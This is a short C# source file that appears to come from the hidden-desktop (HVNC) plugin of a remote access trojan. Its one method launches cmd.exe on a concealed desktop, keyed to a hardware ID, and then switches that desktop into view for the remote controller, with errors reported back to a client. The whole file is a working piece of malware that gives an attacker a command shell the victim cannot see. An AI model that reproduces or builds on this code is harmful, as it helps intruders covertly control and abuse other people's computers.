using System;
using System.IO;
using System.Threading;

namespace Plugin.Helper.OpenApp;

internal class CommandPrompt
{
	private static readonly string fileNameCmd = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";

	public static void Open()
	{
		try
		{
			if (File.Exists(fileNameCmd))
			{
				HideDesktop.CreateProcess(fileNameCmd, Plugin.hwid, bAppName: false);
				Thread.Sleep(2000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("Cmd: " + ex.Message);
		}
	}
}
